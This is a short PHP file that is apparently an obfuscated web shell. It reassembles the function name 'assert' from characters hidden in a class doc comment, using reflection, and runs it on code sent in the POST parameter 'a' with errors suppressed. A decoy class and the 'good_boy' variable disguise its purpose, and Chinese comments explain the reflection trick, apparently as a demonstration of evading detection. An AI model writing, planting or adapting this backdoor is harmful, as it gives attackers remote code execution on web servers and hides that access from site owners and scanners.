<?php
/**
-
as
-
5
-
se
-
*/ 
class a{
   function say(){$moza = "good_boy";}
}
$aa = new ReflectionClass(new a());//建立反射对象
$arr = explode("*", $aa->getDocComment());//获取对象a的注释
$str = ereg_replace("-","",$arr[2]);//获取对象a的注释
$payload = $str[4].$str[15].$str[15]."ert";//assert
$a = $_POST['a'];@$payload($a=$a);
?>